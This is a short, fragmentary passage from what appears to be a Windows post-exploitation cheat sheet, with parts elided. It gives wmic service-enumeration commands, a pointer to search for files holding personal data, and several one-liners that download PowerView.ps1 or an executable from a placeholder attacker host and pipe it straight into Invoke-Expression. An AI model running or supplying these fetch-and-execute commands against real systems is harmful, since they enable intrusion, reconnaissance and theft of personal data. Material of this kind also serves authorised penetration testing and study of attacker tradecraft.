...
# Via wmic
wmic service list
wmic service where caption="MyService" get name, caption, state, startmode
...
#via registry if you have no per
...
```
- *search for potentially intersting files that contain PII*
...
```powershell
 Invoke-WebRequest https://<ip>:<Port>/PowerView.ps1 | iex
 wget https://<ip>:<Port>/PowerView.ps1 | iex
 curl https://<ip>:<Port>/PowerView.ps1 | iex
```
...
IwR -Uri http://IP:Port/file.exe -Outfile file.exe | iex
```
